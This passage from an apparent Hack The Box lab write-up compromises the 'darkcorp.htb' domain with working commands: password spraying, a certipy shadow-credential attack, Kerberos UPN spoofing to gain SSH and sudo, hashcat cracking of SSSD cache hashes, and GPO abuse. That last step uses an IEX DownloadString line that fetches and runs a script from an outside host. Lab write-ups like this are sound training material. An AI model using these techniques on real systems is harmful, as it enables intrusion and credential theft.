┌──(kali㉿kali)-[~/Desktop/htb]
└─$ nxc smb 172.16.20.1 -u user.txt -p Pack_Beneath_Solid9! --continue-on-success
SMB         172.16.20.1     445    DC-01            [*] Windows 10.0 Build 20348 x64 (name:DC-01) (domain:darkcorp.htb) (signing:True) (SMBv1:False)
SMB         172.16.20.1     445    DC-01            [-] darkcorp.htb\Administrator:Pack_Beneath_Solid9! STATUS_LOGON_FAILURE 
SMB         172.16.20.1     445    DC-01            [-] darkcorp.htb\Guest:Pack_Beneath_Solid9! STATUS_LOGON_FAILURE 
SMB         172.16.20.1     445    DC-01            [-] darkcorp.htb\krbtgt:Pack_Beneath_Solid9! STATUS_LOGON_FAILURE 
SMB         172.16.20.1     445    DC-01            [-] darkcorp.htb\victor.r:Pack_Beneath_Solid9! STATUS_LOGON_FAILURE 
SMB         172.16.20.1     445    DC-01            [-] darkcorp.htb\svc_acc:Pack_Beneath_Solid9! STATUS_LOGON_FAILURE 
SMB         172.16.20.1     445    DC-01            [+] darkcorp.htb\john.w:Pack_Beneath_Solid9!
```

## 3. shadow credential

![[Pasted image 20250424141724.png]]
```python
┌──(kali㉿kali)-[~/Desktop/htb]
└─$ certipy shadow auto -username john.w@darkcorp.htb -password Pack_Beneath_Solid9! -account 'ANGELA.W' -dc-ip 172.16.20.1 -target DC-01.darkcorp.htb -scheme ldap
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Targeting user 'angela.w'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID '4cbb9ac7-bb9e-2b74-06b7-a5b954ea58fb'
[*] Adding Key Credential with device ID '4cbb9ac7-bb9e-2b74-06b7-a5b954ea58fb' to the Key Credentials for 'angela.w'
[*] Successfully added Key Credential with device ID '4cbb9ac7-bb9e-2b74-06b7-a5b954ea58fb' to the Key Credentials for 'angela.w'
[*] Authenticating as 'angela.w' with the certificate
[*] Using principal: angela.w@darkcorp.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'angela.w.ccache'
[*] Trying to retrieve NT hash for 'angela.w'
[*] Restoring the old Key Credentials for 'angela.w'
[*] Successfully restored the old Key Credentials for 'angela.w'
[*] NT hash for 'angela.w': 957246c8137069bca672dc6aa0af7c7a
```

## 4. attack `angela.w`
* https://www.pentestpartners.com/security-blog/a-broken-marriage-abusing-mixed-vendor-kerberos-stacks/
```bash
#!/bin/bash

LOWER_REALM='darkcorp.htb'
UPPER_REALM=$(echo "$LOWER_REALM" | tr '[:lower:]' '[:upper:]')
DC_HOSTNAME='DC-01'

cat << EOF | sed \
-e "s/{{REALM_PLACEHOLDER}}/$UPPER_REALM/g" \
-e "s/{{realm_placeholder}}/$LOWER_REALM/g" \
-e "s/{{dc_hostname}}/$DC_HOSTNAME/g" > custom_krb5.conf
[libdefaults]
    default_realm = {{REALM_PLACEHOLDER}}
    dns_lookup_realm = true
    dns_lookup_kdc = true

[realms]
    {{REALM_PLACEHOLDER}} = {
        kdc = {{dc_hostname}}.{{realm_placeholder}}
        admin_server = {{dc_hostname}}.{{realm_placeholder}}
        default_domain = {{dc_hostname}}.{{realm_placeholder}}
    }

[domain_realm]
    {{realm_placeholder}} = {{REALM_PLACEHOLDER}}
    .{{realm_placeholder}} = {{REALM_PLACEHOLDER}}
EOF
```

```python
┌──(kali㉿kali)-[~/Desktop/htb]
└─$ export KRB5_CONFIG="$PWD/custom_krb5.conf" 

┌──(kali㉿kali)-[~/Desktop/htb]
└─$ bloodyAD --host "dc-01.darkcorp.htb" -d "darkcorp.htb" -u john.w -p 'Pack_Beneath_Solid9!' set object angela.w userPrincipalName -v angela.w.adm

┌──(kali㉿kali)-[~/Desktop/htb]
└─$ getTGT.py darkcorp.htb/angela.W.adm -hashes :957246c8137069bca672dc6aa0af7c7a -principalType NT_ENTERPRISE -dc-ip 172.16.20.1

[*] Saving ticket in angela.W.adm.ccache

┌──(kali㉿kali)-[~/Desktop/htb]
└─$ export KRB5_CONFIG="$PWD/custom_krb5.conf"                    

┌──(kali㉿kali)-[~/Desktop/htb]
└─$ export KRB5CCNAME=/home/kali/Desktop/htb/angela.W.adm.ccache

┌──(kali㉿kali)-[~/Desktop/htb]
└─$ ssh -o GSSAPIAuthentication=yes angela.W.adm@drip.DARKCORP.HTB
Linux drip 6.1.0-28-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.119-1 (2024-11-22) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Could not chdir to home directory /home/darkcorp.htb/angela.w.adm: No such file or directory
angela.w.adm@drip:/$ sudo -l
Matching Defaults entries for angela.w.adm on drip:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    use_pty

User angela.w.adm may run the following commands on drip:
    (ALL : ALL) NOPASSWD: ALL
```

## 5. SSSD extract 

* https://github.com/ricardojoserf/SSSD-creds

```python
┌──(kali㉿kali)-[~/Desktop/htb]
└─$ sh analyze.sh .

### 1 hash found in ./cache_darkcorp.htb.ldb ###

Account:        taylor.b.adm@darkcorp.htb
Hash:           $6$5wwc6mW6nrcRD4Uu$9rigmpKLyqH/.hQ520PzqN2/6u6PZpQQ93ESam/OHvlnQKQppk6DrNjL6ruzY7WJkA2FjPgULqxlb73xNw7n5.                                                                

  =====> Adding ./cache_darkcorp.htb.ldb hashes to hashes.txt <=====

┌──(kali㉿kali)-[~/Desktop/htb]
└─$ hashcat -a 0 hashes.txt /usr/share/wordlists/rockyou.txt

$6$5wwc6mW6nrcRD4Uu$9rigmpKLyqH/.hQ520PzqN2/6u6PZpQQ93ESam/OHvlnQKQppk6DrNjL6ruzY7WJkA2FjPgULqxlb73xNw7n5.:!QAZzaq1
```

## 6. password spray

```python
┌──(kali㉿kali)-[~/Desktop/htb]
└─$ cme smb 172.16.20.1 -u user.txt -p '!QAZzaq1'

SMB         172.16.20.1     445    DC-01            [*] Windows 10.0 Build 20348 x64 (name:DC-01) (domain:darkcorp.htb) (signing:True) (SMBv1:False)
SMB         172.16.20.1     445    DC-01            [+] darkcorp.htb\taylor.b.adm:!QAZzaq1 
```
## 7. GPO abuse
![[Pasted image 20250424155508.png]]

![[Pasted image 20250424155435.png]]



```python
┌──(kali㉿kali)-[~]
└─$ dacledit.py -action 'write' -rights 'FullControl' -principal 'taylor.b.adm' -target-dn 'CN={652CAE9A-4BB7-49F2-9E52-3361F33CE786},CN=POLICIES,CN=SYSTEM,DC=DARKCORP,DC=HTB' 'darkcorp.htb'/'TAYLOR.B.ADM':'!QAZzaq1'

*Evil-WinRM* PS C:\Users\taylor.b.adm\Documents> IEX (New-Object System.Net.WebClient).DownloadString('http://10.10.14.69:443/PowerGPOAbuse.ps1')

*Evil-WinRM* PS C:\Users\taylor.b.adm\Documents> Add-LocalAdmin -GPOIdentity 'SecurityUpdates' -Member 'taylor.b.adm'

*Evil-WinRM* PS C:\Users\taylor.b.adm\Documents> net user taylor.b.adm
User name                    taylor.b.adm
Full Name
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            1/8/2025 2:55:01 PM
Password expires             Never
Password changeable          1/9/2025 2:55:01 PM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   1/8/2025 3:05:12 PM

Logon hours allowed          All

Local Group Memberships      *Administrators       *Remote Management Use
Global Group memberships     *linux_admins         *Domain Users
                             *gpo_manager

*Evil-WinRM* PS C:\Users\Administrator\Desktop> dir


    Directory: C:\Users\Administrator\Desktop


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-ar---         4/23/2025   6:14 PM             34 root.txt
```

![[Pasted image 20250427120836.png]]